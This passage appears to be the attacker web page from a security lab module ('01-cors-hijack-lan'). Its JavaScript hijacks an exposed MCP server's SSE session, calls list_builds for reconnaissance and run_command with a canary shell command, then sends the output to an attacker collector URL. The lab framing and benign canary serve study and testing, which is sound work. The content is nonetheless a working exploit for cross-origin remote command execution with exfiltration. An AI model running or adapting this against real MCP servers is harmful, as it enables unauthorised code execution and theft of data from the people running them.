         Only then does the page fall back to the host that served it on :8080 (MCP) and :9000 (collector).

     The `mcp` / `collector` params map to MCP_CI_URL / LAB_COLLECTOR_URL in .env.example; the page URL is
     ATTACKER_PAGE_URL. If neither params nor ?samehost=1 are given, the page REPORTS the missing config

<script>
  // Targets are EXPLICIT and DNS-optional; the page never guesses. `?mcp=` / `?collector=` win (separate-VM
  // IP mode or stable-DNS mode). `?samehost=1` is the ONLY way to fall back to the host that served the
  // page (single-host tier). NEVER a Docker-only name (mcp.lab.consulereit.nl / collector.lab.consulereit.nl).
  const params = new URLSearchParams(location.search);
  const sameHost = params.get("samehost") === "1";
  const HOST = location.hostname;                       // e.g. 192.0.2.10 or attacker.lab.consulereit.nl
  const CANARY = "id; hostname; echo LAB_CANARY_$$";    // benign proof-of-exec only
  const log = (m) => (document.getElementById("log").textContent += m + "\n");

  // Resolve the MCP + collector targets. Missing config is REPORTED and the attack does not start.
  function resolveTargets() {
    const mcp = params.get("mcp");
    const collector = params.get("collector");
    const missing = [];
    let TARGET, COLLECTOR;
    if (mcp) TARGET = mcp.replace(/\/$/, "");
    else if (sameHost) TARGET = `http://${HOST}:8080`;               // documented same-host mode only
    else missing.push("?mcp=http://<VICTIM_IP>:8080 (the victim MCP base URL)");
    if (collector) COLLECTOR = collector;
    else if (sameHost) COLLECTOR = `http://${HOST}:9000/pwned`;      // documented same-host mode only
    else missing.push("?collector=http://<ATTACKER_IP>:9000/pwned (the attacker collector URL)");
    return { TARGET, COLLECTOR, missing };
  }

  const cfg = resolveTargets();
  if (cfg.missing.length) {
    log("CONFIG ERROR - missing target(s); not starting the attack:");
    cfg.missing.forEach((m) => log("  - " + m));
    log("");
    log("Split-host example (no DNS):");
    log("  http://<ATTACKER_IP>:1337/lan.html?mcp=http://<VICTIM_IP>:8080&collector=http://<ATTACKER_IP>:9000/pwned");
    log("Single-host tier: add &samehost=1 to use the host that served this page.");
  } else {
    runAttack(cfg.TARGET, cfg.COLLECTOR);
  }

  function runAttack(TARGET, COLLECTOR) {
    const SSE = TARGET + "/mcp/sse";
    log("target buildbot-mcp: " + TARGET);
    log("collector:          " + COLLECTOR);

    const pending = new Map();
    let messageUrl = null, sessionId = null, nextId = 1, driven = false;

    const es = new EventSource(SSE);
    es.onerror = () => log("(SSE error - is the victim MCP reachable at " + TARGET + "? is the exposed deployment up?)");
    es.addEventListener("endpoint", (e) => {
      messageUrl = new URL(e.data, SSE).toString();
      sessionId = new URL(messageUrl).searchParams.get("sessionId");
      log("stole session id: " + sessionId);
      drive();
    });
    es.addEventListener("message", (e) => {
      try { const m = JSON.parse(e.data); if (m.id != null && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); } } catch {}
    });

    const post = (body) =>
      fetch(messageUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) }).catch(() => {});
    const rpc = (method, params) =>
      new Promise((resolve) => { const id = nextId++; pending.set(id, resolve); post({ jsonrpc: "2.0", id, method, params }); });

    async function drive() {
      if (driven) return; driven = true;
      await rpc("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" } });
      post({ jsonrpc: "2.0", method: "notifications/initialized" });
      const builds = await rpc("tools/call", { name: "list_builds", arguments: {} });
      log("recon (list_builds):\n" + (builds.result?.content?.[0]?.text ?? ""));
      const out = (await rpc("tools/call", { name: "run_command", arguments: { cmd: CANARY } })).result?.content?.[0]?.text ?? "";
      log("exec output:\n" + out);
      fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
        body: JSON.stringify({ module: "01-cors-hijack-lan", sessionId, output: out }) }).catch(() => {});
      log("exfiltrated to collector ✓");
      es.close();
    }
  }
</script>
